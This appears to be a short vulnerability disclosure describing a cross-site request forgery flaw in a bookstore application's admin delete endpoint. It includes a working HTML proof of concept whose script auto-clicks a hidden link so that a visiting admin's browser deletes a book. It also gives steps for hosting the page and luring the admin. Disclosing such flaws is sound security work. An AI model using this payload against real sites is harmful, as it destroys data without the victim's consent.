| Author KhanhCM ([@khanhchauminh](https://github.com/khanhchauminh)) Version: 1.0Details The GET request for deleting a book with `ISBN=12345` looks like this:  ``` http://127.0.0.1:8888/admin_delete.php?bookisbn=12345  ```  Changing the value of the `bookisbn` parameter under admin privilege will delete the book with that ISBN. A remote attacker can embed the request into an innocent-looking hyperlink:  ``` <a href="http://127.0.0.1:8888/admin_delete.php?bookisbn=12345">View</a>  ``` Step to reproduce  1. First, create a malicious HTML page then host a website containing that page.  PoC: ``` <html> <head>   <title>CSRF PoC</title> </head> <body>   <p>CSRF PoC</p>   <a id='link' href="http://127.0.0.1:8888/admin_delete.php?bookisbn=12345">View</a>   <script>     document.getElementById('link').click();   </script> </body> </html>  ```  2. Entice the admin to click on the link to the malicious site. When the admin browses to that site, the link would be automatically clicked via JavaScript and the book will be deleted.
